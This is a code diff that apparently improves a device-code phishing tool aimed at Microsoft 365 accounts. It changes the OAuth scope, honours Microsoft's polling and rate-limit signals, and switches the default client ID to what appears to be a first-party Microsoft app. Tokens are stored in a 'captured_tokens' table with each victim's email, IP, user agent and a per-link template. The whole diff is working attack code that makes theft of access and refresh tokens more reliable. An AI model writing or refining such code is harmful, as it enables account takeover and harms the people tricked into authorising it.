@@ -11,7 +11,7 @@ async function requestDeviceCode() {
     `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
     new URLSearchParams({
       client_id: CLIENT_ID,
-      resource: 'https://graph.microsoft.com',
+      scope: 'offline_access openid profile email User.Read',
     }),
     { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
   );
@@ -26,13 +26,14 @@ async function requestDeviceCode() {
   };
 }
 
-async function pollForTokens(deviceCode, linkId, userId) {
+async function pollForTokens(deviceCode, linkId, userId, initialInterval) {
   const maxAttempts = 60;
   let attempts = 0;
+  let interval = initialInterval || 5; // Use server-recommended interval (seconds)
 
   while (attempts < maxAttempts) {
     attempts++;
-    await new Promise(resolve => setTimeout(resolve, 5000));
+    await new Promise(resolve => setTimeout(resolve, interval * 1000));
 
     try {
       const response = await axios.post(
@@ -61,7 +62,7 @@ async function pollForTokens(deviceCode, linkId, userId) {
       const tenant = config.AZURE_TENANT || 'common';
 
       // Store encrypted with client_id tracking
-      const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+      const clientIdUsed = config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
       await db.query(
         'INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?)',
         [
@@ -82,15 +83,32 @@ async function pollForTokens(deviceCode, linkId, userId) {
 
       return { success: true, email, access_token, refresh_token };
     } catch (err) {
-      if (err.response?.data?.error === 'authorization_pending') {
+      const errorCode = err.response?.data?.error || '';
+
+      if (errorCode === 'authorization_pending') {
+        // User has not yet authorized - continue polling with same interval
         continue;
-      } else if (err.response?.data?.error === 'authorization_declined') {
+      }
+
+      if (errorCode === 'slow_down') {
+        // Microsoft is rate-limiting - increase interval by 5 seconds
+        interval = interval + 5;
+        continue;
+      }
+
+      if (errorCode === 'authorization_declined') {
         return { success: false, error: 'User declined authorization' };
-      } else if (err.response?.data?.error === 'expired_token') {
+      }
+
+      if (errorCode === 'expired_token') {
         return { success: false, error: 'Code expired' };
-      } else if (attempts >= maxAttempts) {
+      }
+
+      if (attempts >= maxAttempts) {
         return { success: false, error: 'Timeout waiting for user' };
       }
+
+      // For other errors, continue polling
     }
   }
 
